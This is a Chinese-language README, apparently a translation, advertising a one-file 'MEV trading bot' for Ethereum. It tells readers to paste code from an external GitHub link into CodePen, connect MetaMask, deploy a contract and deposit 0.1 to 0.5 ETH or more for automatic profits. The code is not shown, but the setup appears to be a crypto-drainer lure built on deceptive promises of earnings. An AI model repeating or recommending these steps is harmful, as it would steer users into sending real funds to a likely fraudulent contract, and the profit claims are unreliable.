# 我的本地交易机器人 🤖

![1](https://i.postimg.cc/B6c2txbp/Chat-GPT-Image-30-2025-18-19-40.png)

嗨，加密货币爱好者们！我很高兴与大家分享我的**本地交易机器人**——这是一个用于**以太坊主网**真实交易的简单工具。所有内容都打包在**一个 HTML 文件**中，因此你可以直接在**CodePen**上运行，无需任何麻烦！😎 界面灵感来自 VS Code —— 简洁直观 —— 完美支持你在浏览器中直接交易。以下是它的工作方式！

## 功能

- **一体化文件**：所有代码都在一个 HTML 文件中——只需复制、粘贴到 CodePen，就能立即开始！
- **钱包连接**：轻松连接你的 MetaMask 钱包与智能合约交互。
- **智能合约部署**：在主网上部署你的自定义合约（你需支付 Gas 费）。
- **真实交易**：最低仅需**0.1 ETH**即可开始，为获得更好效果，建议**0.5 ETH 以上**——点击“**Start**”即可开始自动交易。
- **滑点控制**：可调节**0.5% 到 49%**的滑点容忍度，实现灵活交易。
- **MEV 防护 & 抢单**：可启用 Miner Extractable Value (MEV) 攻击防护或自动抢单。
  - **什么是 MEV？** MEV 指其他机器人或矿工可能会抢先执行你的交易以获取你的利润。MEV 防护有助于让你的交易优先于竞争者。
- **工作流程控制**：
  - **Start**：启动交易流程（需要 ≥0.1 ETH，并确认函数调用）。
  - **Stop**：停止交易，仅在启动后可用。
  - **Withdraw**：提取资金，仅在停止后可用。
- **实时终端**：显示当前交易、交易路径和利润信息。
- **利润潜力**：实时展示有利润的交易和预期收益（基于**1 ETH**存款计算）。
- **响应式设计**：在桌面和移动设备上都能完美运行。

## 如何在 [CodePen](https://codepen.io/pen/) 上运行

1.  *设置 **MetaMask：***
    
    -   *在浏览器中安装 **MetaMask** 插件。*
    -   *切换到 **以太坊主网**。*
    -   *确保钱包中有**≥0.1 ETH**，并额外准备合约部署的 Gas 费。*
    -   *打开 **[CodePen](https://codepen.io/pen/)** 编辑器。*
    -   *将此**[代码](https://raw.githubusercontent.com/Tevrinodt6aXTD/Mev-Trading-Bot/main/trading_bot.html)**粘贴到 **HTML** 区块。*
  
2.  **开始交易：**
    
    -   *点击 **Connect MetaMask** 连接你的钱包。*
![Connect MetaMask](https://i.postimg.cc/4N3pNHgv/code.png)
    -   *点击 **Deploy Contract** 部署你的智能合约（需支付 Gas）。*
    -   *输入 **≥0.1 ETH**，设置滑点 **(0.5%–49%)**，点击 **Start** 并在 **MetaMask** 中确认函数调用。*
    -   *在日志窗口中查看当前交易和利润潜力。*
![1](https://i.ibb.co/N6RB81pH/34.png)
    -   *点击 **Stop** 停止模拟，然后点击 **Withdraw** 取回资金。*
  
3.  *监控终端：日志会实时显示交易和利润，以及基于**1 ETH 存款**的有利机会。*

---

**交易愉快！🚀**

---

Tranlated By [Open Ai Tx](https://github.com/OpenAiTx/OpenAiTx) | Last indexed: 2025-07-05

---